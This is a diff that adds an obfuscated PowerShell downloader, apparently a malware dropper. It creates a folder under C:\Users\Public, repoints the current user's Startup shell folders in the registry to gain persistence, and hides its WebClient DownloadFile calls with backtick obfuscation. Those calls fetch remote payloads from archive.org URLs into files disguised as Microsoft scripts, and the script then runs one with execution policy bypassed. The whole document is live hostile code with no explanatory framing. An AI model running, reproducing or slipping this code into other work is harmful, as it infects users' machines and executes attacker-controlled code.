@@ -1,0 +1,31 @@
+$A0="C:xxx.com\Run".Replace("xxx.com","\Users\Public")
+$A1 = "CrEP".Replace("EP","eateDirectory")
+$BB = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
+$CC= "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
+$DD = "C:leejonkun".Replace("leejonk","\Users\Public\R")
+$EE ="C:kimjongun".Replace("kimjong","\Users\Public\R")
+$cv = 'C:\Uscat'.Replace("c","ers\Public\Run\Run.b")
+$cd = 'C:\js1'.Replace("j","Users\Public\ Microsoft.p")
+$jj = "C:\jav.com.ps1".Replace("jav.com","Users\Public\ Microsoft")
+$link = 'https://ia601409.us.archive.org/1/items/Serverl/Serverl.txt'
+[system.io.directory]::$A1($A0)
+start-sleep -s 5
+Set-ItemProperty -Path $BB -Name "Startup" -Value $DD;
+Set-ItemProperty -Path $CC -Name "Startup" -Value $EE;
+start-sleep -s 5
+Function vip
+{
+
+
+
+start-sleep -s 5
+
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://ia801402.us.archive.org/6/items/bat_20210331/bat.txt',$cv)){
+}
+start-sleep -s 5
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"($link, $cd)){
+}
+start-sleep -s 3
+powershell -windo 1 -noexit -exec bypass -file $jj
+}
+IEX vip
